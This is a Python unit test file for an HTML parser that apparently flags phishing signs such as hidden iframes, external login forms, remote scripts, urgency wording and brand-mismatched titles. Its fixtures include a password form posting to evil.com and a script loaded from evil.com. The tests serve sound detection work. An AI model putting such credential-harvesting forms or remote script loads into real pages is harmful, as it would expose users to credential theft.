"""
Unit Tests for HTML Parser Component
"""
import unittest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import parser


class TestHTMLParser(unittest.TestCase):
    """Test cases for parser module."""
    
    def test_parse_indicators_empty_html(self):
        """Test parsing with empty HTML."""
        indicators = parser.parse_indicators("", "http://example.com")
        self.assertEqual(indicators, [])
    
    def test_parse_indicators_none_html(self):
        """Test parsing with None HTML."""
        indicators = parser.parse_indicators(None, "http://example.com")
        self.assertEqual(indicators, [])
    
    def test_hidden_iframe_detection(self):
        """Test detection of hidden iframes."""
        html = '''
        <html>
        <body>
            <iframe style="display:none" src="http://evil.com/track"></iframe>
        </body>
        </html>
        '''
        indicators = parser.parse_indicators(html, "http://example.com")
        indicator_names = [i["indicator"] for i in indicators]
        self.assertIn("hidden_iframe", indicator_names)
    
    def test_hidden_iframe_zero_size(self):
        """Test detection of zero-sized iframes."""
        html = '<html><body><iframe width="0" height="0"></iframe></body></html>'
        indicators = parser.parse_indicators(html, "http://example.com")
        indicator_names = [i["indicator"] for i in indicators]
        self.assertIn("hidden_iframe", indicator_names)
    
    def test_external_login_form(self):
        """Test detection of external login forms."""
        html = '''
        <html>
        <body>
            <form action="http://evil.com/submit" method="POST">
                <input type="text" name="username">
                <input type="password" name="password">
            </form>
        </body>
        </html>
        '''
        indicators = parser.parse_indicators(html, "http://example.com")
        indicator_names = [i["indicator"] for i in indicators]
        self.assertIn("external_login_form", indicator_names)
    
    def test_password_field_detection(self):
        """Test detection of password fields."""
        html = '''
        <html>
        <body>
            <form>
                <input type="password" name="pwd">
            </form>
        </body>
        </html>
        '''
        indicators = parser.parse_indicators(html, "http://example.com")
        indicator_names = [i["indicator"] for i in indicators]
        self.assertIn("password_field", indicator_names)
    
    def test_external_script_detection(self):
        """Test detection of external suspicious scripts."""
        html = '''
        <html>
        <head>
            <script src="http://evil.com/script.js"></script>
        </head>
        <body></body>
        </html>
        '''
        indicators = parser.parse_indicators(html, "http://example.com")
        indicator_names = [i["indicator"] for i in indicators]
        self.assertIn("suspicious_script", indicator_names)
    
    def test_cdn_whitelist(self):
        """Test that CDN scripts are not flagged."""
        html = '''
        <html>
        <head>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        </head>
        <body></body>
        </html>
        '''
        indicators = parser.parse_indicators(html, "http://example.com")
        indicator_names = [i["indicator"] for i in indicators]
        self.assertNotIn("suspicious_script", indicator_names)
    
    def test_urgency_keywords(self):
        """Test detection of urgency keywords."""
        html = '''
        <html>
        <body>
            <p>Your account has been suspended. Verify now to restore access.</p>
        </body>
        </html>
        '''
        indicators = parser.parse_indicators(html, "http://example.com")
        indicator_names = [i["indicator"] for i in indicators]
        self.assertIn("urgency_keywords", indicator_names)
    
    def test_no_https_links(self):
        """Test detection of insecure links."""
        html = '''
        <html>
        <body>
            <a href="http://example.com/page">Link</a>
            <a href="/relative">Relative</a>
        </body>
        </html>
        '''
        indicators = parser.parse_indicators(html, "http://example.com")
        indicator_names = [i["indicator"] for i in indicators]
        self.assertIn("no_https_links", indicator_names)
    
    def test_mismatched_title(self):
        """Test detection of brand impersonation in title."""
        html = '''
        <html>
        <head>
            <title>PayPal Login - Secure Account</title>
        </head>
        <body></body>
        </html>
        '''
        indicators = parser.parse_indicators(html, "http://fake-bank.com")
        indicator_names = [i["indicator"] for i in indicators]
        self.assertIn("mismatched_title", indicator_names)
    
    def test_indicator_scores(self):
        """Test that indicators have correct scores."""
        html = '''
        <html>
        <body>
            <iframe style="display:none"></iframe>
            <form action="http://evil.com/submit">
                <input type="password">
            </form>
        </body>
        </html>
        '''
        indicators = parser.parse_indicators(html, "http://example.com")
        
        # Find scores
        scores = {i["indicator"]: i["score"] for i in indicators}
        
        self.assertEqual(scores.get("hidden_iframe"), 3)
        self.assertEqual(scores.get("external_login_form"), 3)
        self.assertEqual(scores.get("password_field"), 2)


if __name__ == "__main__":
    unittest.main()